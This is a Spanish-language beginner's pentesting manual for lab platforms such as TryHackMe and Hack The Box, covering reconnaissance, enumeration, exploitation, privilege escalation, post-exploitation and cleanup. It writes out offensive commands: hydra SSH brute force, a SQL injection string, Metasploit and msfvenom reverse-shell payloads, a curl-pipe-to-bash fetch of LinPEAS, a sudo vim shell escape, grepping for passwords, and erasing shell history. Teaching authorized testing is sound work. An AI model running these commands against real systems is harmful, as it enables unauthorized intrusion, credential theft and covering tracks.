# Manual Completo de Pentesting para Principiantes (Versi√≥n Avanzada)

## üìñ Introducci√≥n al Pentesting

El **Pentesting (Pruebas de Penetraci√≥n)** es un proceso controlado donde se intenta vulnerar la seguridad de sistemas inform√°ticos con el fin de detectar fallos antes que lo haga un atacante real.

Este manual est√° dise√±ado para entornos legales como **TryHackMe** o **Hack The Box**, y para entrenar habilidades √©ticas.

> **‚ö†Ô∏è Advertencia Legal:** Realizar pruebas de penetraci√≥n en sistemas sin permiso expl√≠cito es **ilegal**.

---

# ‚úÖ Fases del Pentesting

## 1. Reconocimiento (Footprinting)

**Objetivo:** Obtener informaci√≥n inicial sobre el objetivo.

### Escaneo de Puertos y Servicios

```bash
nmap -sC -sV -Pn -oN escaneo.txt [IP_VICTIMA]
```

- `-Pn`: evita detecci√≥n previa de host.
- `-sC`: scripts NSE por defecto.
- `-sV`: detectar versiones de servicios.
- `-oN`: salida normal a archivo.

#### Escaneo agresivo:

```bash
nmap -A -oN escaneo_avanzado.txt [IP]
```

### Escaneo UDP:

```bash
sudo nmap -sU -oN udp.txt [IP]
```

### Enumeraci√≥n de DNS (si aplica):

```bash
dig @8.8.8.8 dominio.com ANY
```

---

## 2. Enumeraci√≥n (Fingerprinting)

**Objetivo:** Recoger m√°s informaci√≥n espec√≠fica de los servicios encontrados.

### Enumeraci√≥n Web:

```bash
gobuster dir -u http://[IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

o

```bash
ffuf -u http://[IP]/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### Vulnerabilidades espec√≠ficas:

- **WordPress:**

```bash
wpscan --url http://[IP] --enumerate u,vp,vt
```

#### Enumeraci√≥n SMB:

```bash
enum4linux -a [IP]
smbclient -L //[IP]/
```

#### Enumeraci√≥n de FTP:

```bash
ftp [IP]
```

#### Enumeraci√≥n SSH:

```bash
hydra -l usuario -P rockyou.txt ssh://[IP]
```

---

## 3. Explotaci√≥n

**Objetivo:** Conseguir acceso inicial al sistema.

### Explotaci√≥n Manual

- **Inyecciones SQL:**

```sql
' OR 1=1 --
```

- **Subida de archivos maliciosos:** PHP shells (ejemplo `php-reverse-shell.php`)

### Usando Metasploit

```bash
msfconsole
search [servicio/vulnerabilidad]
use exploit/[path]
set RHOSTS [IP]
set PAYLOAD [payload]
set LHOST [TU_IP]
run
```

#### Payloads comunes:

- `linux/x86/meterpreter/reverse_tcp`
- `windows/meterpreter/reverse_tcp`

#### Crear payloads con msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[TU_IP] LPORT=4444 -f exe -o shell.exe
```

---

## 4. Escalada de Privilegios

**Objetivo:** Obtener permisos de administrador/root.

### Enumeraci√≥n de privilegios:

```bash
sudo -l
```

### Buscar archivos SUID:

```bash
find / -perm -4000 2>/dev/null
```

### Herramientas autom√°ticas:

- **LinPEAS:**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

- **winPEAS (Windows):**

```powershell
Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEASany.exe
```

#### Explotaci√≥n de sudoers:

```bash
sudo /usr/bin/vim -c '!sh'
```

---

## 5. Post-Explotaci√≥n

**Objetivo:** Obtener informaci√≥n cr√≠tica.

#### Archivos comunes:

```bash
cat /etc/passwd
cat /root/root.txt
cat /home/usuario/user.txt
```

#### Buscar contrase√±as:

```bash
grep -i pass /etc/* 2>/dev/null
cat ~/.bash_history
```

#### Persistencia (solo entornos de pruebas):

- Crear usuarios.
- Cron jobs.
- SSH Keys.

---

## 6. Limpieza (NO EN THM/HTB)

- Borrar shells y exploits.
- Borrar comandos del history.
- Revocar permisos generados.

```bash
history -c
```

---

# üõ†Ô∏è Herramientas B√°sicas

| Categor√≠a        | Herramienta               |
| ---------------- | ------------------------- |
| Escaneo          | nmap                      |
| Enumeraci√≥n Web  | gobuster, ffuf, dirsearch |
| SMB              | enum4linux, smbclient     |
| Fuerza bruta     | hydra, medusa             |
| Explotaci√≥n      | Metasploit, searchsploit  |
| Escalada Linux   | LinPEAS, LinEnum          |
| Escalada Windows | winPEAS                   |
| Reversas         | nc, rlwrap, socat         |

---

# ‚úÖ Orden recomendado al atacar

1. nmap
2. Visitar el sitio web ‚Üí gobuster ‚Üí ffuf
3. Buscar exploits por versi√≥n ‚Üí searchsploit
4. Intentar explotaci√≥n manual
5. Usar Metasploit si es necesario
6. Buscar flags / root.txt
7. Escalar privilegios ‚Üí LinPEAS / winPEAS
8. Obtener contrase√±as y otras evidencias

---

# ‚ö†Ô∏è Recomendaciones Finales

- Practica **√©tica profesional**.
- Solo pentestea sistemas donde tengas **permiso**.
- Documenta todos tus pasos.
- Estudia CVEs y expl√≥its actualizados.
- Empieza por plataformas como **TryHackMe** o **Hack The Box**.

---

# üîñ Recursos adicionales

- [https://tryhackme.com](https://tryhackme.com)
- [https://book.hacktricks.xyz](https://book.hacktricks.xyz)
- [https://gtfobins.github.io](https://gtfobins.github.io)
- [https://www.exploit-db.com](https://www.exploit-db.com)
- [https://pentestmonkey.net](https://pentestmonkey.net)

Fin del manual.

